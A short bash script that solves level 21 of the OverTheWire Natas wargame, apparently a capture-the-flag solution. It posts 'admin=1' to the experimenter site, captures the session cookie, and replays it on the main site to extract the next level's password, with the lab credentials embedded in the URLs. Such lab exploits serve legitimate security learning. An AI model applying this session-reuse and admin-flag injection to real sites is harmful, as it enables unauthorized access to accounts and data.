#!/bin/bash
. ../natas.sh
natas_url="http://natas21:IFekPyrQXftziDEsUr3x21sYuahypdgJ@natas21.natas.labs.overthewire.org?debug=debug"
natas_exp_url="http://natas21:IFekPyrQXftziDEsUr3x21sYuahypdgJ@natas21-experimenter.natas.labs.overthewire.org?debug=debug"
function hack() {
	session_id=$(request-natas-exp 2>&1 | grep -Po "(?<=PHPSESSID=)[\w\d]+")
	password=$(request-natas "$session_id" 2>&1 | grep -Po "(?<=Password:\s)[\d\w]+")
	echo $(get-natas-url "22" "$password")
}

function request-natas() {
	curl \
		-vs \
		--cookie $(generate-attack-string $1) \
		$natas_url
}

function request-natas-exp() {
	curl \
		-vs \
		-d "submit=submit&admin=1" \
		$natas_exp_url
}

function generate-attack-string() {
	printf "PHPSESSID=$1"
}